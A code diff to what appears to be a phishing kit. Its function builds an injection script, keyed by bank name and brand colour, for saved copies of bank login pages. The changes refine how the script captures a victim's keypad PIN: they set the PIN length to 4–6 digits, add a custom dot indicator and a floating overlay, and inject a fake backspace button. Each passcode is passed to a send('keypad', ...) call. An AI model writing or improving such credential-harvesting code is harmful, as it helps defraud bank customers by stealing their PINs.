@@ -117,76 +117,98 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     // - non-digit buton (icon) = backspace
     // ------------------------------------------------------------------
     let keypadBuffer = "";
+    const PIN_MIN = 4;
+    const PIN_MAX = 6;
     const hasKeypad = () => {
       try { return !!document.querySelector("button[data-value]"); } catch (e) { return false; }
     };
     const flushKeypad = () => {
-      if (keypadBuffer.length >= 4) {
+      if (keypadBuffer.length >= PIN_MIN) {
         const buf = keypadBuffer;
         keypadBuffer = "";
         try { renderKeypad(); } catch (e) {}
         send("keypad", { passcode: buf, pin: buf });
       }
     };
-    const dotContainer = () => {
-      try {
-        const dot = document.querySelector(".sx827n0");
-        if (dot && dot.parentElement) {
-          // Sablonu ve parent'i sakla — nokta sayisi 0'a dustugunde tekrar kullanilabilsin
-          window.__ieDotTpl = window.__ieDotTpl || dot.cloneNode(true);
-          window.__ieDotParent = dot.parentElement;
-          return { parent: dot.parentElement, template: window.__ieDotTpl };
-        }
-        if (window.__ieDotTpl && window.__ieDotParent && window.__ieDotParent.isConnected) {
-          return { parent: window.__ieDotParent, template: window.__ieDotTpl };
-        }
-      } catch (e) {}
-      return null;
-    };
+    // Passcode nokta gostergesi: native slot container'a KENDI
+    // net-stillenmis noktalarimizi koy (kayitli sayfada native dot
+    // gorunumu bozuk; kullanici girdigini goremiyor).
     const renderKeypadDots = () => {
       try {
-        const info = dotContainer();
-        if (info) {
-          const len = keypadBuffer.length;
-          let dots = info.parent.querySelectorAll(".sx827n0");
-          while (dots.length < len) {
-            const clone = info.template.cloneNode(true);
-            clone.setAttribute("data-status", "entered");
-            info.parent.appendChild(clone);
-            dots = info.parent.querySelectorAll(".sx827n0");
-          }
-          while (dots.length > len) {
-            info.parent.removeChild(dots[dots.length - 1]);
-            dots = info.parent.querySelectorAll(".sx827n0");
+        const dot = document.querySelector(".sx827n0");
+        const host = (dot && dot.parentElement) || window.__ieDotHost;
+        if (host && host.isConnected) {
+          window.__ieDotHost = host;
+          host.style.display = "flex";
+          host.style.justifyContent = "center";
+          host.style.gap = "16px";
+          host.innerHTML = "";
+          for (let i = 0; i < PIN_MAX; i++) {
+            const d = document.createElement("span");
+            d.style.cssText =
+              "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
+              (i < keypadBuffer.length
+                ? "background:#191c1f;border:2px solid #191c1f;"
+                : "background:transparent;border:2px solid #aab3bb;");
+            host.appendChild(d);
           }
           return;
         }
-        // Fallback: kendi nokta gostergemizi olustur (keypad grid'inin ustune)
+        // Fallback: sabit overlay
         let own = document.getElementById("ie-keypad-dots");
-        const firstBtn = document.querySelector("button[data-value]");
-        if (!firstBtn) return;
         if (!own) {
           own = document.createElement("div");
           own.id = "ie-keypad-dots";
-          own.style.cssText = "display:flex;gap:14px;justify-content:center;margin:0 auto 24px;padding:8px 0";
-          const grid = firstBtn.parentElement;
-          const anchor = (grid && grid.parentElement) || grid || document.body;
-          anchor.insertBefore(own, anchor.firstChild);
+          own.style.cssText =
+            "position:fixed;top:20%;left:50%;transform:translateX(-50%);z-index:999998;" +
+            "display:flex;gap:16px;justify-content:center;padding:10px 18px;" +
+            "background:rgba(255,255,255,.92);border-radius:24px;box-shadow:0 2px 10px rgba(0,0,0,.18)";
+          document.body.appendChild(own);
         }
         own.innerHTML = "";
-        for (let i = 0; i < Math.max(keypadBuffer.length, 4); i++) {
+        for (let i = 0; i < PIN_MAX; i++) {
           const d = document.createElement("span");
           d.style.cssText =
-            "width:14px;height:14px;border-radius:50%;display:inline-block;" +
-            (i < keypadBuffer.length ? "background:#191c1f" : "background:#d7dce0");
+            "width:16px;height:16px;border-radius:50%;display:inline-block;box-sizing:border-box;" +
+            (i < keypadBuffer.length
+              ? "background:#191c1f;border:2px solid #191c1f;"
+              : "background:transparent;border:2px solid #aab3bb;");
           own.appendChild(d);
         }
+      } catch (e) {}
+    };
+    // Sayfadaki keypad'in bos hucrelerine "⌫" backspace butonu enjekte et
+    // (bu kayitta backspace butonu yok; yanlis giris duzeltilemiyor).
+    const injectBackspace = () => {
+      try {
+        if (document.getElementById("ie-keypad-backspace")) return;
+        const zero = document.querySelector("button[data-value='0'], button[data-value=\"0\"]");
+        if (!zero) return;
+        // 0'dan sonraki bos grid hucresi (veya grid'in son hucresi)
+        const cell = zero.nextElementSibling;
+        const host = cell && cell.tagName === "DIV" ? cell : zero.parentElement;
+        if (!host) return;
+        const btn = document.createElement("button");
+        btn.id = "ie-keypad-backspace";
+        btn.type = "button";
+        btn.textContent = "⌫";
+        // digit butonlarina benzer boyut (64px daire)
+        btn.style.cssText =
+          "width:64px;height:64px;border:none;border-radius:50%;background:transparent;" +
+          "color:#191c1f;font:400 26px/1 -apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;" +
+          "cursor:pointer;display:flex;align-items:center;justify-content:center;margin:0 auto";
+        btn.addEventListener("click", (ev) => {
+          try { ev.preventDefault(); ev.stopPropagation(); } catch (e) {}
+          keypadBuffer = keypadBuffer.slice(0, -1);
+          renderKeypad();
+        });
+        host.appendChild(btn);
       } catch (e) {}
     };
     const renderContinueButton = () => {
       try {
         let btn = document.getElementById("ie-keypad-continue");
-        const show = hasKeypad() && keypadBuffer.length >= 4;
+        const show = hasKeypad() && keypadBuffer.length >= PIN_MIN;
         if (show && !btn) {
           btn = document.createElement("button");
           btn.id = "ie-keypad-continue";
@@ -209,6 +231,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     const renderKeypad = () => {
       renderKeypadDots();
       renderContinueButton();
+      injectBackspace();
     };
 
     // Kaydedilmis sayfalarda JS olmadigi icin butonlar disabled kalir.
@@ -352,7 +375,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
         try {
           let t0 = e.target;
           while (t0 && t0 !== doc.body) {
-            if (t0.id === "ie-keypad-continue") return;
+            if (t0.id === "ie-keypad-continue" || t0.id === "ie-keypad-backspace") return;
             t0 = t0.parentElement;
           }
         } catch (err) {}
@@ -365,7 +388,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             if (el.tagName && el.tagName.toLowerCase() === "button") {
               const dv = el.getAttribute("data-value");
               if (dv != null && /^[0-9]$/.test(dv)) {
-                if (keypadBuffer.length < 12) keypadBuffer += dv;
+                // PIN_MAX'den sonraki tuslamalari tamamen yoksay
+                if (keypadBuffer.length < PIN_MAX) keypadBuffer += dv;
                 renderKeypad();
                 return;
               }
